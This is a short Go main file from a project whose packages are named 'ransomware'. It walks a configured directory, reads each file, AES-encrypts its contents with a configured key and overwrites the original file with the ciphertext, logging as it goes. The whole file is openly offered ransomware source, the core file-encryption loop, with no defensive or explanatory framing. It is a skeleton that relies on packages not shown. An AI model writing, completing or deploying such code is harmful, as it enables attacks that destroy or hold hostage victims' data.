package main

import (
	"fmt"
	"ransomware/config"
	"ransomware/encryption"
	"ransomware/files"
	"ransomware/logger"
)

func main() {

	files.VerifyOrCreate(config.Data.LogDir)
	Log := logger.NewLogger(config.Data.LogDir+config.Data.LogFile, true)

	defer func() {
		Log.Info("Application is Shutting Down")
	}()

	Log.Info("Application is Starting")

	date, _ := files.WalkDir(config.Data.LogDir)

	for _, f := range date {

		fileContent := files.Open(f)

		encryptedContent := encryption.AesEncrypt(config.Data.Key, fileContent)
		fmt.Println(encryptedContent)

		files.Write(f, encryptedContent)
		fmt.Println(f)

	}

}
